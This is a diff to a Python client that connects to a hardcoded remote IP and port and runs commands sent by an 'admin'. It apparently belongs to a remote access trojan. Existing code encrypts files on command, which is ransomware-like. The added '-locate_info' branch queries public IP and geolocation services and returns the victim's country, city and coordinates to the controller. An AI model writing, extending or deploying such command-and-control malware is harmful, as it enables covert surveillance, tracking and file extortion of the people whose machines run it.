@@ -3,6 +3,7 @@ import threading
 import getpass
 import os
 import webbrowser
+import requests
 from cryptography.fernet import Fernet
 
 IP = "191.101.229.172"
@@ -10,6 +11,7 @@ PORT = 9999
 key = None
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 
 def generate_key():
     return Fernet.generate_key()
@@ -53,6 +55,28 @@ def perform_action(command, payload, admin_nickname):
         result = payload
     elif command == "reverse":
         result = payload[::-1]
+
+    elif command == "-locate_info":
+            
+        try:
+            response = requests.get("https://api.ipify.org?format=json")
+            usr_ip = response.json()['ip']
+        except Exception as e:
+            result=e
+
+        try:
+            response = requests.get(f"http://ip-api.com/json/{usr_ip}")
+            data = response.json()
+
+            if data["status"] == "success":
+                result = (f"IP : {usr_ip}\nCountry : {data['country']}\nRegion : {data['regionName']}\nCity : {data['city']}\nLatitude : {data['lat']}\nLongtitude : {data['lon']}")
+
+            else:
+                result = ("Error: Unable to get location data.")
+
+        except Exception as e:
+            result = e
+
     elif command.startswith("-crypt"):
         key = generate_key()
         if os.path.isfile(payload):
